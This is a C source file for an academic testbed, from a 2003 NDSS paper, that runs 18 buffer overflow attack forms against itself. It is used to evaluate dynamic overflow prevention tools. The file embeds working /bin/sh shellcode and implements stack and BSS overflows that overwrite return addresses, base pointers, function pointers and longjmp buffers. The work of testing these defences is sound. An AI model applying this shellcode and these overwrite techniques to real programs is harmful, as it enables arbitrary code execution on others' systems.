/*
 * Dynamic testbed for twenty buffer overflow attack forms
 *
 * Published at Network & Distributed System Security Symposium 2003:
 * "A Comparison of Publicly Available Tools for Dynamic Buffer
 * Overflow Prevention"
 *
 * Copyright 2003 John Wilander
 * Dept. of Computer Science, Linkoping University, Sweden
 * johwi@ida.liu.se
 * http://www.ida.liu.se/~johwi
 *
 * This is a slightly old version of the source code where only 18
 * of the 20 attack forms are implemented. Missing are:
 * Buffer overflow of pointer on heap/BSS and then pointing to
 *   - Target: Parameter function pointer
 *   - Target: Parameter longjmp buffer
 * I should be pretty easy to re-implement these cases.
 *
 * CONDITIONS OF USAGE: If you use this code for analysis, testing,
 * development, implementation, or the like, in any public, published,
 * or commercial work you should refer to to our original NDSS'03
 * paper (see above) and give acknowledgement to the author of the
 * source code. This source code header must not be removed. Apart
 * from that you can use it freely! The author takes no responsibility
 * for how you use it. Good luck!
 */

#include <stdio.h>
#include <setjmp.h>
#include <string.h>

#define BUFSIZE 16
#define OVERFLOWSIZE 256

int base_pointer_offset;
long overflow_buffer[OVERFLOWSIZE];
char shellcode[] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh"; /* Implemented by Aleph One */


int main(int argc, char **argv);

/*****************************************************************/
/*              Stack-based buffer overflow attacks              */
/*****************************************************************/

void parameter_func_pointer(int choice, void (*stack_function_pointer)()) {
  long *stack_pointer;
  long stack_buffer[BUFSIZE];
  char propolice_dummy[10];
  int overflow;

  /* Just a dummy pointer setup */
  stack_pointer = &stack_buffer[1];

  if ((choice == -4) &&
      ((long)&choice > (long)&propolice_dummy)) {
    /* First set up overflow_buffer with 'A's and a
       new function pointer pointing to the shellcode */
    overflow = (int)((long)&stack_function_pointer - (long)&stack_buffer);
    memset(overflow_buffer, 'A', overflow);
    overflow_buffer[overflow/4] = (long)&shellcode;

    /* Then overflow stack_buffer with overflow_buffer  */
    memcpy(stack_buffer, overflow_buffer, overflow+4);

    /* Function call using the function pointer */
    (void)(*stack_function_pointer)();
  }
  else if ((choice == -2) &&
	   ((long)&stack_pointer > (long)&propolice_dummy)) {
    /* First set up overflow_buffer with the address of the
       shellcode, a few 'A's and a pointer to the function pointer */
    overflow = (int)((long)&stack_pointer - (long)&stack_buffer) + 4;
    printf("Overflow = %lx\n", overflow);
    overflow_buffer[0] = (long)&shellcode;
    memset(overflow_buffer+1, 'A', overflow-8);
    overflow_buffer[overflow/4-1] = (long)(&stack_function_pointer);

    /* Then overflow stack_buffer with overflow_buffer */
    memcpy(stack_buffer, overflow_buffer, overflow);

    /* Overwritten data from stack_buffer is copied to where
       the stack_pointer is pointing */
    *stack_pointer = stack_buffer[0];

    /* Function call using the function pointer */
    (void)(*stack_function_pointer)();
  }
  return;
}

void vuln_parameter_function_ptr(int choice) {
  void (*stack_function_pointer)(void);

  parameter_func_pointer(choice, stack_function_pointer);
  return;
}

/*****************************************************************/

void parameter_longjmp_buf(int choice, jmp_buf stack_jmp_buffer) {
  long *stack_pointer;
  long stack_buffer[BUFSIZE];
  char propolice_dummy[10];
  int overflow, i, offset;

  if ((choice == -3) &&
      ((long)&stack_jmp_buffer[0].__jmpbuf[5] > (long)&propolice_dummy)) {
    /* First set up overflow_buffer with copies of address to
       stack_jmp_buffer's argument pointer, and a fake jmp_buf
       containing a new program counter pointing to the shellcode */
    overflow = (int)((long)&stack_jmp_buffer[0].__jmpbuf[5]
		     - (long)&stack_buffer);

    printf("overflow = %lx\n", overflow);
    for(i=0; i<overflow/4; i++)
      overflow_buffer[i] = (long)stack_jmp_buffer;

    /* Copy BX, SI, DI, BP and SP from stack_jmp_buffer */
    for (i=0; i<5; i++)
      overflow_buffer[overflow/4-5+i] = (long)stack_jmp_buffer[0].__jmpbuf[i];
    overflow_buffer[overflow/4] = (long)&shellcode;

    /* Then overflow stack_buffer with overflow_buffer  */
    memcpy(stack_buffer, overflow_buffer, overflow+4);
  }

  else if ((choice == -1) &&
	   ((long)&stack_pointer > (long)&propolice_dummy)) {
    /* First set up overflow_buffer with the address of the
       shellcode, a few 'A's and a pointer to the program
       counter in stack_jmp_buffer*/
    overflow = (int)((long)&stack_pointer - (long)&stack_buffer) + 4;
    overflow_buffer[0] = (long)&shellcode;
    memset(overflow_buffer+1, 'A', overflow-8);
    overflow_buffer[overflow/4-1] = (long)&stack_jmp_buffer[0].__jmpbuf[5];

    /* Then overflow stack_buffer with overflow_buffer */
    memcpy(stack_buffer, overflow_buffer, overflow);

    /* Overwritten data from stack_buffer is copied to where
       the stack_pointer is pointing */
    *stack_pointer = stack_buffer[0];
  }

  else printf("Attack form not possible\n");
  longjmp(stack_jmp_buffer, 1);
}


void vuln_parameter_longjmp_buf(int choice) {
  jmp_buf stack_jmp_buffer;

  if (setjmp(stack_jmp_buffer) != 0) {
    printf("Longjmp buffer attack failed.\n");
    return; }

  parameter_longjmp_buf(choice, stack_jmp_buffer);
  return;
}

/*****************************************************************/

void vuln_stack_return_addr(int choice) { /* Attack forms 1(a) and 3(a) */
  long *stack_pointer;
  long stack_buffer[BUFSIZE];
  char propolice_dummy[10];
  int overflow;

  /* Just a dummy pointer setup */
  stack_pointer = &stack_buffer[1];

  if ((choice == 1) &&
      ((long)&choice > (long)&propolice_dummy)) {
    /* First set up overflow_buffer with 'A's and a new return address */
    overflow = (int)((long)&choice - (long)&stack_buffer);
    memset(overflow_buffer, 'A', overflow-4);
    overflow_buffer[overflow/4-1] = (long)&shellcode;

    /* Then overflow stack_buffer with overflow_buffer */
    memcpy(stack_buffer, overflow_buffer, overflow); }

  else if ((choice == 7) &&
	   ((long)&stack_pointer > (long)&propolice_dummy)) {
    /* First set up overflow_buffer with the address of the
       shellcode, a few 'A's and a pointer to the return address */
    overflow = (int)((long)&stack_pointer - (long)&stack_buffer) + 4;
    overflow_buffer[0] = (long)&shellcode;
    memset(overflow_buffer+1, 'A', overflow-8);
    overflow_buffer[overflow/4-1] = (long)(&choice-1);

    /* Then overflow stack_buffer with overflow_buffer */
    memcpy(stack_buffer, overflow_buffer, overflow);

    /* Overwritten data from stack_buffer is copied to where
       the stack_pointer is pointing */
    *stack_pointer = stack_buffer[0];
  }
  else printf("Attack form not possible\n");
  return;
}

/*****************************************************************/

void vuln_stack_base_ptr(int choice) { /* Attack forms 1(b) and 3(b) */
  long *stack_pointer;
  long stack_buffer[BUFSIZE];
  char propolice_dummy[10];
  int overflow, i;

  /* Just a dummy pointer setup */
  stack_pointer = &stack_buffer[1];

  if ((choice == 2) &&
      ((long)&choice > (long)&propolice_dummy)) {
    /* First set up overflow_buffer with a fake stack frame
       consisting of a base pointer and a return address
       pointing to the shellcode, a few 'A's and a new 
       base pointer pointing back at the fake stack frame */
    overflow = (int)((long)&choice - (long)&stack_buffer)-base_pointer_offset;
    /* Copy base pointer */
    overflow_buffer[0] = (long)(&choice-1-(base_pointer_offset/4));
    /* Fake return address */
    overflow_buffer[1] = (long)&shellcode;
    memset(overflow_buffer+2, 'A', overflow-4);
    overflow_buffer[overflow/4-1] = (long)&stack_buffer[0];

    /* Then overflow stack_buffer with overflow_buffer */
    memcpy(stack_buffer, overflow_buffer, overflow);
  }

  else if ((choice == 8) &&
	   ((long)&stack_pointer > (long)&propolice_dummy)) {
    /* First set up overflow_buffer with a fake stack frame
       consisting of a base pointer and a return address
       pointing to the shellcode, a few 'A's and a pointer
       to the old base pointer */
    overflow = (int)((long)&stack_pointer - (long)&stack_buffer) + 4;
    overflow_buffer[0] = (long)&stack_buffer[1];
    /* Copy base pointer */
    overflow_buffer[1] = (long)(&choice-1-(base_pointer_offset/4));
    /* Fake return address */
    overflow_buffer[2] = (long)&shellcode;
    memset(overflow_buffer+3, 'A', overflow-4*(3+1));
    /* Old base pointer */
    overflow_buffer[overflow/4-1] = (long)(&choice-1-(base_pointer_offset/4));

    /* Then overflow stack_buffer with overflow_buffer  */
    /* Now stack_pointer points to the old base pointer */
    memcpy(stack_buffer, overflow_buffer, overflow);

    /* Overwritten data from stack_buffer is copied to where
       the stack_pointer is pointing */
    *stack_pointer = stack_buffer[0];
  }
  else printf("Attack form not possible\n");
  return;
}

/*****************************************************************/

void vuln_stack_function_ptr(int choice) { /* Attack forms 1(c) and 3(c) */
  void (*stack_function_pointer)(void);
  long *stack_pointer;
  long stack_buffer[BUFSIZE];
  char propolice_dummy[10];
  int overflow;

  if ((choice == 3) &&
      ((long)&stack_function_pointer > (long)&propolice_dummy)) {
    /* First set up overflow_buffer with 'A's and a
       new function pointer pointing to the shellcode */
    overflow = (int)((long)&stack_function_pointer - (long)&stack_buffer);
    memset(overflow_buffer, 'A', overflow);
    overflow_buffer[overflow/4] = (long)&shellcode;

    /* Then overflow stack_buffer with overflow_buffer  */
    memcpy(stack_buffer, overflow_buffer, overflow+4);

    /* Function call using the function pointer */
    (void)(*stack_function_pointer)();
  }

  else if ((choice == 9) &&
	   ((long)&stack_pointer > (long)&propolice_dummy)) {
    /* First set up overflow_buffer with the address of the
       shellcode, a few 'A's and a pointer to the function pointer */
    overflow = (int)((long)&stack_pointer - (long)&stack_buffer) + 4;
    overflow_buffer[0] = (long)&shellcode;
    memset(overflow_buffer+1, 'A', overflow-8);
    overflow_buffer[overflow/4-1] = (long)(&stack_function_pointer);

    /* Then overflow stack_buffer with overflow_buffer */
    memcpy(stack_buffer, overflow_buffer, overflow);

    /* Overwritten data from stack_buffer is copied to where
       the stack_pointer is pointing */
    *stack_pointer = stack_buffer[0];

    /* Function call using the function pointer */
    (void)(*stack_function_pointer)();
  }
  else printf("Attack form not possible\n");
  return;
}

/*****************************************************************/

void vuln_stack_longjmp_buf(int choice) { /* Attack forms 1(d) and 3(d) */
  jmp_buf stack_jmp_buffer;
  long *stack_pointer;
  long stack_buffer[BUFSIZE];
  char propolice_dummy[10];
  int overflow, i;

  if (setjmp(stack_jmp_buffer) != 0) {
    printf("Longjmp buffer attack failed.\n");
    return; }

  if ((choice == 4) &&
      ((long)&stack_jmp_buffer[0].__jmpbuf[5] > (long)&propolice_dummy)) {
    /* First set up overflow_buffer with 'A's and a fake jmp_buf
       containing a new program counter pointing to the shellcode */
    overflow = (int)((long)&stack_jmp_buffer[0].__jmpbuf[5]
		     - (long)&stack_buffer);
    memset(overflow_buffer, 'A', overflow-5*4);
    /* Copy BX, SI, DI, BP and SP from stack_jmp_buffer */
    for (i=0; i<5; i++)
      overflow_buffer[overflow/4-5+i] = (long)stack_jmp_buffer[0].__jmpbuf[i];
    overflow_buffer[overflow/4] = (long)&shellcode;

    /* Then overflow stack_buffer with overflow_buffer  */
    memcpy(stack_buffer, overflow_buffer, overflow+4);
  }

  else if ((choice == 10) &&
	   ((long)&stack_pointer > (long)&propolice_dummy)) {
    /* First set up overflow_buffer with the address of the
       shellcode, a few 'A's and a pointer to the program
       counter in stack_jmp_buffer*/
    overflow = (int)((long)&stack_pointer - (long)&stack_buffer) + 4;
    overflow_buffer[0] = (long)&shellcode;
    memset(overflow_buffer+1, 'A', overflow-8);
    overflow_buffer[overflow/4-1] = (long)&stack_jmp_buffer[0].__jmpbuf[5];

    /* Then overflow stack_buffer with overflow_buffer */
    memcpy(stack_buffer, overflow_buffer, overflow);

    /* Overwritten data from stack_buffer is copied to where
       the stack_pointer is pointing */
    *stack_pointer = stack_buffer[0];
  }

  else printf("Attack form not possible\n");
  longjmp(stack_jmp_buffer, 1);
}

/*****************************************************************/
/*               BSS-based buffer overflow attacks               */
/*****************************************************************/

void vuln_bss_return_addr(int choice) { /* Attack form 4(a)*/
  static char propolice_dummy_2[10];
  static long bss_buffer[BUFSIZE];
  static long *bss_pointer;
  char propolice_dummy_1[10];
  int overflow;

if ((choice == 11) &&
	   ((long)&bss_pointer > (long)&propolice_dummy_2)) {
    /* First set up overflow_buffer with the address of the
       shellcode, a few 'A's and a pointer to the return address */
    overflow = (int)((long)&bss_pointer - (long)&bss_buffer) + 4;
    overflow_buffer[0] = (long)&shellcode;
    memset(overflow_buffer+1, 'A', overflow-8);
    overflow_buffer[overflow/4-1] = (long)(&choice-1);

    /* Then overflow bss_buffer with overflow_buffer */
    memcpy(bss_buffer, overflow_buffer, overflow);

    /* Overwritten data from bss_buffer is copied to where
       the bss_pointer is pointing */
    *bss_pointer = bss_buffer[0];
  }
  else printf("Attack form not possible\n");
  return;
}

/*****************************************************************/

void vuln_bss_base_ptr(int choice) { /* Attack form 4(b)*/
  static char propolice_dummy_2[10];
  static long bss_buffer[BUFSIZE];
  static long *bss_pointer;
  char propolice_dummy_1[10];
  int overflow;

  if ((choice == 12) &&
	   ((long)&bss_pointer > (long)&propolice_dummy_2)) {
    /* First set up overflow_buffer with a fake stack frame
       consisting of a base pointer and a return address
       pointing to the shellcode, a few 'A's and a pointer
       to the old base pointer */
    overflow = (int)((long)&bss_pointer - (long)&bss_buffer) + 4;
    overflow_buffer[0] = (long)&bss_buffer[1];
    /* Copy base pointer */
    overflow_buffer[1] = (long)(&choice-1-(base_pointer_offset/4));
    /* Fake return address */
    overflow_buffer[2] = (long)&shellcode;
    memset(overflow_buffer+3, 'A', overflow-4*(3+1));
    /* Old base pointer */
    overflow_buffer[overflow/4-1] = (long)(&choice-1-(base_pointer_offset/4));

    /* Then overflow bss_buffer with overflow_buffer  */
    /* Now bss_pointer points to the old base pointer */
    memcpy(bss_buffer, overflow_buffer, overflow);

    /* Overwritten data from bss_buffer is copied to where
       the bss_pointer is pointing */
    *bss_pointer = bss_buffer[0];
  }
  else printf("Attack form not possible\n");
  return;
}

/*****************************************************************/

void vuln_bss_function_ptr(int choice) { /* Attack forms 2(a) and 4(c) */
  static char propolice_dummy_2[10];
  static long bss_buffer[BUFSIZE];
  static long *bss_pointer;
  static void (*bss_function_pointer)(void);
  char propolice_dummy_1[10];
  int overflow;

  if ((choice == 5) &&
      ((long)&bss_function_pointer > (long)&propolice_dummy_2)) {
    /* First set up overflow_buffer with 'A's and a
       new function pointer pointing to the shellcode */
    overflow = (int)((long)&bss_function_pointer - (long)&bss_buffer);
    printf("overflow = %ld\n", overflow);
    memset(overflow_buffer, 'A', overflow);
    overflow_buffer[overflow/4] = (long)&shellcode;

    /* Then overflow bss_buffer with overflow_buffer  */
    memcpy(bss_buffer, overflow_buffer, overflow+4);

    /* Function call using the function pointer */
    (void)(*bss_function_pointer)();
  }

  else if ((choice == 13) &&
	   ((long)&bss_pointer > (long)&propolice_dummy_2)) {
    /* First set up overflow_buffer with the address of the
       shellcode, a few 'A's and a pointer to the function pointer */
    overflow = (int)((long)&bss_pointer - (long)&bss_buffer) + 4;
    overflow_buffer[0] = (long)&shellcode;
    memset(overflow_buffer+1, 'A', overflow-8);
    overflow_buffer[overflow/4-1] = (long)(&bss_function_pointer);

    /* Then overflow bss_buffer with overflow_buffer */
    memcpy(bss_buffer, overflow_buffer, overflow);

    /* Overwritten data from bss_buffer is copied to where
       the bss_pointer is pointing */
    *bss_pointer = bss_buffer[0];

    /* Function call using the function pointer */
    (void)(*bss_function_pointer)();
  }
  else printf("Attack form not possible\n");
  return;
}

/*****************************************************************/

void vuln_bss_longjmp_buf(int choice) { /* Attack forms 2(b) and 4(d) */
  static char propolice_dummy_2[10];
  static long bss_buffer[BUFSIZE];
  static long *bss_pointer;
  static jmp_buf bss_jmp_buffer;
  char propolice_dummy_1[10];
  int overflow, i;

  if (setjmp(bss_jmp_buffer) != 0) {
    printf("Longjmp buffer attack failed.\n");
    return; }

  if ((choice == 6) &&
      ((long)&bss_jmp_buffer[0].__jmpbuf[5] > (long)&propolice_dummy_2)) {
    /* First set up overflow_buffer with 'A's and a fake jmp_buf
       containing a new program counter pointing to the shellcode */
    overflow = (int)((long)&bss_jmp_buffer[0].__jmpbuf[5]
		     - (long)&bss_buffer);
    memset(overflow_buffer, 'A', overflow-5*4);
    /* Copy BX, SI, DI, BP and SP from bss_jmp_buffer */
    for (i=0; i<5; i++)
      overflow_buffer[overflow/4-5+i] = (long)bss_jmp_buffer[0].__jmpbuf[i];
    overflow_buffer[overflow/4] = (long)&shellcode;

    /* Then overflow bss_buffer with overflow_buffer  */
    memcpy(bss_buffer, overflow_buffer, overflow+4);
  }

  else if ((choice == 14) &&
	   ((long)&bss_pointer > (long)&propolice_dummy_2)) {
    /* First set up overflow_buffer with the address of the
       shellcode, a few 'A's and a pointer to the program
       counter in bss_jmp_buffer*/
    overflow = (int)((long)&bss_pointer - (long)&bss_buffer) + 4;
    overflow_buffer[0] = (long)&shellcode;
    memset(overflow_buffer+1, 'A', overflow-8);
    overflow_buffer[overflow/4-1] = (long)&bss_jmp_buffer[0].__jmpbuf[5];

    /* Then overflow bss_buffer with overflow_buffer */
    memcpy(bss_buffer, overflow_buffer, overflow);

    /* Overwritten data from bss_buffer is copied to where
       the bss_pointer is pointing */
    *bss_pointer = bss_buffer[0];
  }
  else printf("Attack form not possible\n");
  longjmp(bss_jmp_buffer, 1);
}

/*****************************************************************/
/*                          main()                               */
/*****************************************************************/

int main (int argc, char **argv) {
  int choice;
  if (argc < 2 || atoi(argv[1]) < -4 || atoi(argv[1]) > 14) {
    fprintf(stderr, "\nUsage: %s <int> <optional base pointer offset>\n",
	    argv[0]);
    fprintf(stderr, "\nBuffer overflow on stack all the way to the target\n");
    fprintf(stderr, "-4 =  Target: Parameter function pointer\n");
    fprintf(stderr, "-3 =  Target: Parameter longjmp buffer\n");
    fprintf(stderr, " 1 =  Target: Return address\n");
    fprintf(stderr, " 2 =  Target: Old base pointer\n");
    fprintf(stderr, " 3 =  Target: Function pointer\n");
    fprintf(stderr, " 4 =  Target: Longjmp buffer\n");
    fprintf(stderr, "\nBuffer overflow on heap/BSS all the way to the target\n");
    fprintf(stderr, " 5 =  Target: Function pointer\n");
    fprintf(stderr, " 6 =  Target: Longjmp buffer\n");
    fprintf(stderr, "\nBuffer overflow of pointer on stack and then pointing to target\n");
    fprintf(stderr, "-2 =  Target: Parameter function pointer\n");
    fprintf(stderr, "-1 =  Target: Parameter longjmp buffer\n");
    fprintf(stderr, " 7 =  Target: Return address\n");
    fprintf(stderr, " 8 =  Target: Old base pointer\n");
    fprintf(stderr, " 9 =  Target: Function pointer\n");
    fprintf(stderr, "10 = Target: Longjmp buffer\n");
    fprintf(stderr, "\nBuffer overflow of pointer on heap/BSS and then pointing to target\n");
    fprintf(stderr, "11 = Target: Return address\n");
    fprintf(stderr, "12 = Target: Old base pointer\n");
    fprintf(stderr, "13 = Target: Function pointer\n");
    fprintf(stderr, "14 = Target: Longjmp buffer\n\n");
    fprintf(stderr, "Optional base pointer offset = number of bytes inbetween return address and base pointer on stack (used with canary values).\n\n");
    return -1; }

  /* We add the 4 normal bytes that differ between the address
     to the return address and the old base pointer */
  if(argc > 2 && atoi(argv[2]) > 0) {
    base_pointer_offset = atoi(argv[2]) + 4;
    printf("Using base pointer offset = %i\n", atoi(argv[2])); }
  else {
    base_pointer_offset = 4;
    printf("Using base pointer offset = 0 (normal)\n"); }

  choice = atoi(argv[1]);
  switch(choice) {
  case -4:
    vuln_parameter_function_ptr(choice);
    printf("Attack prevented.\n");
    break;
  case -3:
    vuln_parameter_longjmp_buf(choice);
    printf("Attack prevented.\n");
    break;
  case -2:
    vuln_parameter_function_ptr(choice);
    printf("Attack prevented.\n");
    break;
  case -1:
    vuln_parameter_longjmp_buf(choice);
    printf("Attack prevented.\n");
    break;
  case 1:
    vuln_stack_return_addr(choice);
    printf("Attack prevented.\n");
    break;
  case 2:
    vuln_stack_base_ptr(choice);
    printf("Attack prevented.\n");
    break;
  case 3:
    vuln_stack_function_ptr(choice);
    printf("Attack prevented.\n");
    break;
  case 4:
    vuln_stack_longjmp_buf(choice);
    printf("Attack prevented.\n");
    break;
  case 5:
    vuln_bss_function_ptr(choice);
    printf("Attack prevented.\n");
    break;
  case 6:
    vuln_bss_longjmp_buf(choice);
    printf("Attack prevented.\n");
    break;
  case 7:
    vuln_stack_return_addr(choice);
    printf("Attack prevented.\n");
    break;
  case 8:
    vuln_stack_base_ptr(choice);
    printf("Attack prevented.\n");
    break;
  case 9:
    vuln_stack_function_ptr(choice);
    printf("Attack prevented.\n");
    break;
  case 10:
    vuln_stack_longjmp_buf(choice);
    printf("Attack prevented.\n");
    break;
  case 11:
    vuln_bss_return_addr(choice);
    printf("Attack prevented.\n");
    break;
  case 12:
    vuln_bss_base_ptr(choice);
    printf("Attack prevented.\n");
    break;
  case 13:
    vuln_bss_function_ptr(choice);
    printf("Attack prevented.\n");
    break;
  case 14:
    vuln_bss_longjmp_buf(choice);
    printf("Attack prevented.\n");
    break;
  default:
    break; }
  return 0;
}
